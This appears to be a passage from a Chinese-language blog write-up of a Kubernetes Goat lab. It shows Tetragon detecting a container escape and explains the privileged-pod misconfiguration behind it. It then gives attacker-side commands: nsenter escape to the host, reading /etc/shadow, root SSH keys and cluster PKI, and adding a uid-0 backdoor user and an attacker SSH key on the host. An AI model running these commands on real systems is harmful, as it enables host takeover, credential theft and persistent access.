+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl rollout status -n kube-system ds/tetragon -w</span><br></pre></td></tr></table></figure>
+<p>成功安装了。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260419230736052.png" alt="image-20260419230736052" loading="lazy" decoding="async"></p>
+<p>Cilium的新型Tetragon组件实现了强大的基于eBPF的实时安全可观测和运行时强制执行。</p>
+<p>Tetragon能够检测并应对具有重大安全意义的事件，例如：</p>
+<ul>
+<li>进程执行事件。</li>
+<li>I/O活动，包括网络和文件访问。</li>
+</ul>
+<p>在Kubernetes环境中使用时，Tetragon具有Kubernetes感知能力——也就是说，它能够理解Kubernetes的身份，例如命名空间、Pod等——以便可以根据各个工作负载配置安全事件检测。</p>
+<ul>
+<li>运行以下命令，了解有关Tetragon部署的更多详细信息。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods -n kube-system --selector app.kubernetes.io/instance=tetragon</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260420204132628.png" alt="image-20260420204132628" loading="lazy" decoding="async"></p>
+<ul>
+<li>使用以下命令手动从Tetragon获取日志。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f </span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260420204212357.png" alt="image-20260420204212357" loading="lazy" decoding="async"></p>
+<ul>
+<li>现在，我们使用系统监控pod并尝试提升到宿主机系统的权限，看看 Tetragon 是否能检测到。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> POD_NAME=$(kubectl get pods -l <span class="string">&quot;app=system-monitor&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span><br><span class="line">kubectl <span class="built_in">exec</span> -it <span class="variable">$POD_NAME</span> -- bash</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260420211452454.png" alt="image-20260420211452454" loading="lazy" decoding="async"></p>
+<p>还可以使用本地系统中的官方<code>tetra</code>CLI客户端以更友好的方式查看这些事件。根据操作系统，下载<a target="_blank" rel="noopener" href="https://github.com/cilium/tetragon">对应版本的工具</a>。</p>
+<p>现在，可以运行以下命令，将Tetragon事件的输出传递给本地的<code>tetra</code>CLI，以便更直观地查看。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f | ./tetra getevents -o compact --namespace default --pod <span class="string">&#x27;system-monitor-deployment-*&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260420214653322.png" alt="image-20260420214653322" loading="lazy" decoding="async"></p>
+<p><code>tetra</code>cli提供对Kubernetes、命名空间和其他细节（如进程等）的上下文感知。查询时，你甚至可以将其限制为进程、命名空间、Pod，甚至支持正则表达式。</p>
+<p>下面来演示一下如何使用Tetragon检测权限提升攻击。你可以使用<code>system-monitor</code> pod执行容器逃逸，通过运行以下命令来获取主机系统访问权限。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入到 system-monitor pod</span></span><br><span class="line"><span class="built_in">export</span> POD_NAME=$(kubectl get pods -l <span class="string">&quot;app=system-monitor&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)kubectl <span class="built_in">exec</span> -it <span class="variable">$POD_NAME</span> -- bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 nsenter 来获取主机系统的访问权限</span></span><br><span class="line">nsenter -t 1 -m --uts --ipc --pid</span><br></pre></td></tr></table></figure>
+<p>正如你在下方看到的，Tetragon正在运行，几乎可以实时检测到这些攻击。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f | ./tetra getevents -o compact --namespace default --pod <span class="string">&#x27;system-monitor-deployment-*&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260420215915065.png" alt="image-20260420215915065" loading="lazy" decoding="async"></p>
+<p>可以看到成功检测到了攻击。</p>
+<h3 id="容器逃逸" tabindex="-1"><a class="headerlink" href="#容器逃逸" aria-hidden="true"></a> 容器逃逸</h3>
+<p><strong>下面来解释一下，这个容器逃逸的攻击，为什么可以容器逃逸？🤔</strong></p>
+<p>这个pod启动时候的配置为：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hostPID:</span> <span class="literal">true</span>                    <span class="comment"># 共享宿主机 PID 命名空间</span></span><br><span class="line"><span class="attr">hostIPC:</span> <span class="literal">true</span>                    <span class="comment"># 共享宿主机 IPC 命名空间</span></span><br><span class="line"><span class="attr">securityContext:</span></span><br><span class="line">  <span class="attr">allowPrivilegeEscalation:</span> <span class="literal">true</span> <span class="comment"># 允许权限提升</span></span><br><span class="line">  <span class="attr">privileged:</span> <span class="literal">true</span>               <span class="comment"># 特权容器</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host-filesystem</span></span><br><span class="line">  <span class="attr">hostPath:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/</span>                      <span class="comment"># 挂载宿主机根目录</span></span><br></pre></td></tr></table></figure>
+<p>各个配置的作用：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">配置项</th>
+<th style="text-align:left">作用</th>
+<th style="text-align:left">风险</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">hostPID: true</td>
+<td style="text-align:left">容器能看到宿主机所有进程，包括 PID 1</td>
+<td style="text-align:left">攻击者可定位到宿主机 init 进程</td>
+</tr>
+<tr>
+<td style="text-align:left">privileged: true</td>
+<td style="text-align:left">容器拥有几乎所有宿主机 root 权限</td>
+<td style="text-align:left">可以执行敏感系统调用</td>
+</tr>
+<tr>
+<td style="text-align:left">allowPrivilegeEscalation: true</td>
+<td style="text-align:left">允许进程获得更多权限</td>
+<td style="text-align:left">配合其他条件实现提权</td>
+</tr>
+<tr>
+<td style="text-align:left">hostPath: /</td>
+<td style="text-align:left">挂载宿主机根目录到容器</td>
+<td style="text-align:left">容器内可直接读写宿主机文件</td>
+</tr>
+</tbody>
+</table>
+<p>漏洞利用的链条：</p>
+<blockquote>
+<p>hostPID=true  →  看到宿主机 PID 1 进程<br>
+↓<br>
+privileged=true  →  有权限执行 nsenter 系统调用<br>
+↓<br>
+nsenter -t 1  →  进入 init 进程的命名空间<br>
+↓<br>
+获得宿主机 root 权限（容器逃逸成功）</p>
+</blockquote>
+<p><strong>那如果我是一个攻击者，怎么知道pod中存在这么一个可以进行容器逃逸的环境呢？如何以攻击者的视角去发现这个容器逃逸？🤔</strong></p>
+<h4 id="第一步，确认环境，我在哪？" tabindex="-1"><a class="headerlink" href="#第一步，确认环境，我在哪？" aria-hidden="true"></a> <strong>第一步</strong>，确认环境，我在哪？</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 查看当前主机名</span></span><br><span class="line">hostname</span><br><span class="line"><span class="comment"># 如果包含随机字符串如 &quot;system-monitor-deployment-xxx&quot;，说明在 Pod 中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 检查 /.dockerenv 或 /run/.containerenv 文件</span></span><br><span class="line"><span class="built_in">ls</span> -la /.dockerenv 2&gt;/dev/null || <span class="built_in">ls</span> -la /run/.containerenv 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 查看 cgroup 信息</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br><span class="line"><span class="comment"># 如果包含 &quot;kubepods&quot;、&quot;docker&quot;、&quot;containerd&quot; 等关键字，确认在容器中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 看 Kubernetes 环境变量</span></span><br><span class="line"><span class="built_in">env</span> | grep -i kubernetes</span><br><span class="line"><span class="comment"># 是否包含KUBERNETES_xxx等k8s相关的配置信息</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260420221808673.png" alt="image-20260420221808673" loading="lazy" decoding="async"></p>
+<h4 id="第二步，探测危险配置，我能逃出去吗？" tabindex="-1"><a class="headerlink" href="#第二步，探测危险配置，我能逃出去吗？" aria-hidden="true"></a> <strong>第二步</strong>，探测危险配置，我能逃出去吗？</h4>
+<h5 id="1-是否有特权？" tabindex="-1"><a class="headerlink" href="#1-是否有特权？" aria-hidden="true"></a> 1. 是否有特权？</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查当前进程是否有 CAP_SYS_ADMIN 权限</span></span><br><span class="line">capsh --<span class="built_in">print</span> 2&gt;/dev/null | grep cap_sys_admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者查看 /proc/self/status 中的 CapEff</span></span><br><span class="line"><span class="built_in">cat</span> /proc/self/status | grep CapEff</span><br><span class="line"><span class="comment"># 值为 0000003fffffffff 或 ffffffffffffffff 表示有全部权限（privileged）</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260420222709914.png" alt="image-20260420222709914" loading="lazy" decoding="async"></p>
+<p>发现了<code>CapEff: 000001ffffffffff</code>，表示有全部的权限。</p>
+<p><strong>为什么<code>000001ffffffffff</code>就表示了全部权限？？？🤔</strong></p>
+<p>因为 Linux capabilities 是用<strong>位图（bitmap）</strong>来表示的，CapEff 的值是一个十六进制掩码，每一位对应一个具体的权限。</p>
+<p><strong>位掩码计算</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">位位置：  40      39      38      ...     2       1       0</span><br><span class="line">         ↓       ↓       ↓               ↓       ↓       ↓</span><br><span class="line">值：     1       1       1       ...     1       1       1</span><br><span class="line">         |       |       |               |       |       |</span><br><span class="line">         2^40    2^39    2^38            2^2     2^1     2^0</span><br></pre></td></tr></table></figure>
+<p>为什么是<code>000001ffffffffff</code>这个值？</p>
+<p><code>000001ffffffffff</code>的含义：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">十六进制：0000003fffffffff</span><br><span class="line">二进制：  0011 1111 1111 1111 1111 1111 1111 1111 1111 1111</span><br><span class="line"></span><br><span class="line">= 2^0 + 2^1 + 2^2 + ... + 2^37</span><br><span class="line">= 0 到 37 号 capability 全部开启（共 38 个）</span><br></pre></td></tr></table></figure>
+<p>这表示前 38 个标准 capabilities 全部启用，包括：</p>
+<ul>
+<li><code>CAP_SYS_ADMIN</code>（21 位）- 系统管理</li>
+<li><code>CAP_SYS_PTRACE</code>（19 位）- 进程追踪</li>
+<li><code>CAP_SYS_MODULE</code>（16 位）- 加载内核模块</li>
+<li><code>CAP_NET_ADMIN</code>（12 位）- 网络管理</li>
+<li>等等…</li>
+</ul>
+</blockquote>
+<p>还有<code>ffffffffffffffff</code>的含义</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">十六进制：ffffffffffffffff</span><br><span class="line">二进制：  1111 1111 1111 1111 ... 1111 1111（64 个 1）</span><br><span class="line"></span><br><span class="line">= 所有 64 位全部置 1</span><br></pre></td></tr></table></figure>
+<p>表示所有 capabilities 全开（包括将来新增的）。</p>
+</blockquote>
+<h5 id="2-是否共享hostpid？" tabindex="-1"><a class="headerlink" href="#2-是否共享hostpid？" aria-hidden="true"></a> 2. 是否共享hostPID？</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 PID 1 的进程名</span></span><br><span class="line">ps aux | grep <span class="string">&quot;PID 1&quot;</span></span><br><span class="line"><span class="comment"># 或 cat /proc/1/comm</span></span><br><span class="line"><span class="comment"># 如果是 systemd、init、kubelet 等，说明能看到宿主机进程</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 /proc 目录下的进程数量</span></span><br><span class="line"><span class="built_in">ls</span> /proc/ | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="comment"># 如果数量很多（几百个），而容器应该只有几个进程，说明共享了 hostPID</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260420223323199.png" alt="image-20260420223323199" loading="lazy" decoding="async"></p>
+<p><code>cat /proc/1/comm</code>发现是<code>systemd</code>，进程数量126个。</p>
+<p><strong>为什么这样就可以说明共享了 hostPID？</strong>🤔</p>
+<p><strong>正常容器的情况：</strong></p>
+<blockquote>
+<p>在标准容器中，PID 命名空间是隔离的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">容器视角的进程树：</span><br><span class="line">PID 1: nginx (容器的主进程)</span><br><span class="line">  ├─ PID 7: nginx worker</span><br><span class="line">  ├─ PID 8: nginx worker</span><br><span class="line">  └─ PID 15: bash (你执行的 shell)</span><br></pre></td></tr></table></figure>
+<p>容器内看不到宿主机上的 systemd、kubelet、dockerd 等系统进程。</p>
+</blockquote>
+<p><strong>当前情况（hostPID=true）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/comm</span><br><span class="line"><span class="comment"># 输出: systemd</span></span><br></pre></td></tr></table></figure>
+<p><code>systemd</code> 是 Linux 系统的 1 号进程（init 系统），它只应该存在于宿主机上，绝不应该出现在普通容器的 PID 1 位置。</p>
+<p>这说明：</p>
+<ul>
+<li>容器和宿主机共享同一个 PID 命名空间</li>
+<li>容器内可以看到宿主机的完整进程树</li>
+<li>PID 1 就是宿主机的 systemd/init 进程</li>
+</ul>
+<p><strong>为什么 126 个进程也说明问题？</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /proc/ | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="comment"># 输出: 126</span></span><br></pre></td></tr></table></figure>
+<p>对比数据</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">环境</th>
+<th style="text-align:left">典型进程数</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">轻量级容器</td>
+<td style="text-align:left">5-10 个</td>
+<td style="text-align:left">只有主进程 + 少量子进程</td>
+</tr>
+<tr>
+<td style="text-align:left">普通应用容器</td>
+<td style="text-align:left">10-30 个</td>
+<td style="text-align:left">应用进程 + 系统服务</td>
+</tr>
+<tr>
+<td style="text-align:left">当前环境</td>
+<td style="text-align:left">126 个</td>
+<td style="text-align:left">宿主机级别进程数量</td>
+</tr>
+<tr>
+<td style="text-align:left">完整宿主机</td>
+<td style="text-align:left">100-300+ 个</td>
+<td style="text-align:left">系统服务 + 所有容器进程</td>
+</tr>
+</tbody>
+</table>
+<p>126 个进程明显是宿主机级别的数量，包含：</p>
+<ul>
+<li>systemd 及其服务（kubelet、dockerd/containerd、sshd 等）</li>
+<li>其他容器的进程</li>
+<li>系统守护进程</li>
+</ul>
+<h5 id="3-是否有hostpath挂载？" tabindex="-1"><a class="headerlink" href="#3-是否有hostpath挂载？" aria-hidden="true"></a> 3. 是否有hostPath挂载？</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看挂载信息</span></span><br><span class="line">mount | grep -E <span class="string">&quot;(hostPath|/dev|/sys)&quot;</span></span><br><span class="line"><span class="comment"># 如果能看到 /host-system、/ 等宿主机根目录挂载，说明可以读写宿主机文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 /host-system 目录</span></span><br><span class="line"><span class="built_in">ls</span> -la /host-system/</span><br><span class="line"><span class="comment"># 如果存在 etc、root、var 等目录，确认是宿主机根目录</span></span><br></pre></td></tr></table></figure>
+<p>这里发现了<code>/host-system</code></p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260420225005399.png" alt="image-20260420225005399" loading="lazy" decoding="async"></p>
+<p>查看<code>/host-system</code>目录。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260420225047378.png" alt="image-20260420225047378" loading="lazy" decoding="async"></p>
+<p>这是知道有hostPath挂载的情况下，要是不知道有hostPath挂载，怎么办？🤔</p>
+<p><strong>攻击者RCE了这个pod，现在想去做一个容器逃逸，怎么去探测路径？怎么去找到挂载了宿主机根目录或者是挂载了其它敏感的宿主机目录的pod目录？</strong></p>
+<p><strong>第一、发现所有挂载点：</strong></p>
+<p>查看完整的mount信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有挂载</span></span><br><span class="line">mount</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只看可能包含 host 文件的挂载（磁盘类设备）</span></span><br><span class="line">mount | grep -E <span class="string">&quot;^/dev&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤出看起来是 hostPath 的（排除容器标准挂载如 /proc, /sys, /dev）</span></span><br><span class="line">mount | grep -v -E <span class="string">&quot;(proc|sysfs|tmpfs|cgroup|devpts|mqueue|shm)&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260421165025905.png" alt="image-20260421165025905" loading="lazy" decoding="async"></p>
+<p>检查/proc/mounts</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/mounts | grep -v -E <span class="string">&quot;^(proc|sysfs|tmpfs|cgroup|devpts|mqueue|shm|overlay)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更精简：只看 ext4/xfs 等真实文件系统</span></span><br><span class="line"><span class="built_in">cat</span> /proc/mounts | grep -E <span class="string">&quot;(ext4|xfs|btrfs|nfs)&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260421165137810.png" alt="image-20260421165137810" loading="lazy" decoding="async"></p>
+<p>扫描根目录下的可疑文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出根目录所有目录</span></span><br><span class="line"><span class="built_in">ls</span> -la /</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击者会重点关注这些常见 hostPath 挂载名：</span></span><br><span class="line"><span class="built_in">ls</span> -la /host* 2&gt;/dev/null          <span class="comment"># /host, /host-system, /host-root</span></span><br><span class="line"><span class="built_in">ls</span> -la /mnt/* 2&gt;/dev/null          <span class="comment"># 可能挂载到 /mnt 下</span></span><br><span class="line"><span class="built_in">ls</span> -la /data 2&gt;/dev/null           <span class="comment"># 常见数据挂载点</span></span><br><span class="line"><span class="built_in">ls</span> -la /kube* 2&gt;/dev/null          <span class="comment"># k8s 相关</span></span><br><span class="line"><span class="built_in">ls</span> -la /var/lib 2&gt;/dev/null        <span class="comment"># 检查 /var/lib 是否是 host 的</span></span><br></pre></td></tr></table></figure>
+<p><strong>第二、识别hostPath挂载：</strong></p>
+<p>挂载可能是hostPath，如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 挂载设备是宿主机磁盘（如 /dev/sda1, /dev/vda1）</span></span><br><span class="line">mount | grep -E <span class="string">&quot;/dev/(sd|vd|nvme|xvd|sda|dm-)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 挂载路径包含敏感目录关键词</span></span><br><span class="line">mount | grep -E <span class="string">&quot;(etc|root|var|home|opt|usr|boot)&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260421165825869.png" alt="image-20260421165825869" loading="lazy" decoding="async"></p>
+<p><strong>第三、验证是否是敏感/可逃逸目录</strong></p>
+<p>检查是否是宿主机根目录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果怀疑 /host-system 是 host 根目录</span></span><br><span class="line"><span class="built_in">ls</span> /host-system/etc/os-release      <span class="comment"># 看宿主机系统版本</span></span><br><span class="line"><span class="built_in">cat</span> /host-system/etc/hostname       <span class="comment"># 宿主机主机名</span></span><br><span class="line"><span class="built_in">cat</span> /host-system/proc/1/comm        <span class="comment"># 应该是 systemd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对比容器内的 hostname</span></span><br><span class="line">hostname                          <span class="comment"># Pod 名称</span></span><br><span class="line"><span class="built_in">cat</span> /host-system/etc/hostname     <span class="comment"># 宿主机名称（应该不同）</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260421170155007.png" alt="image-20260421170155007" loading="lazy" decoding="async"></p>
+<p>检查写权限（能否篡改宿主机）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试写入能力（小心操作，避免破坏）</span></span><br><span class="line"><span class="built_in">touch</span> /host-system/tmp/.test_write 2&gt;/dev/null &amp;&amp; \</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[!] 可写！可以写入宿主机！&quot;</span> &amp;&amp; \</span><br><span class="line">    <span class="built_in">rm</span> /host-system/tmp/.test_write</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查关键目录的写权限</span></span><br><span class="line"><span class="built_in">ls</span> -ld /host-system/etc /host-system/root /host-system/var</span><br></pre></td></tr></table></figure>
+<p>查看能访问哪些敏感数据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 宿主机用户密码</span></span><br><span class="line"><span class="built_in">cat</span> /host-system/etc/shadow 2&gt;/dev/null | <span class="built_in">head</span> -3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. SSH 密钥</span></span><br><span class="line"><span class="built_in">ls</span> -la /host-system/root/.ssh/ 2&gt;/dev/null</span><br><span class="line"><span class="built_in">cat</span> /host-system/root/.ssh/id_rsa 2&gt;/dev/null | <span class="built_in">head</span> -5</span><br><span class="line"><span class="built_in">cat</span> /host-system/root/.ssh/authorized_keys 2&gt;/dev/null | <span class="built_in">head</span> -3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. K8s 凭证（如果能访问 kubelet）</span></span><br><span class="line"><span class="built_in">ls</span> /host-system/var/lib/kubelet/pki/ 2&gt;/dev/null</span><br><span class="line"><span class="built_in">ls</span> /host-system/etc/kubernetes/pki/ 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 容器运行时 socket（如果能访问 docker/containerd）</span></span><br><span class="line"><span class="built_in">ls</span> -la /host-system/var/run/docker.sock 2&gt;/dev/null</span><br><span class="line"><span class="built_in">ls</span> -la /host-system/run/containerd/containerd.sock 2&gt;/dev/null</span><br><span class="line"><span class="built_in">ls</span> -la /host-system/run/crio/crio.sock 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>寻找其他容器的数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看其他容器的文件系统（如果 overlay 目录可访问）</span></span><br><span class="line"><span class="built_in">ls</span> /host-system/var/lib/docker/overlay2/ 2&gt;/dev/null</span><br><span class="line"><span class="built_in">ls</span> /host-system/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/ 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看其他 Pod 的日志</span></span><br><span class="line"><span class="built_in">ls</span> /host-system/var/log/pods/ 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><strong>第四、利用 hostPath逃逸</strong></p>
+<p>直接修改宿主机文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加后门用户到宿主机</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;backdoor:$6$xyz$xxx:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /host-system/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者写入 SSH 公钥</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /host-system/root/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAA... attacker@evil.com&quot;</span> &gt;&gt; /host-system/root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 600 /host-system/root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
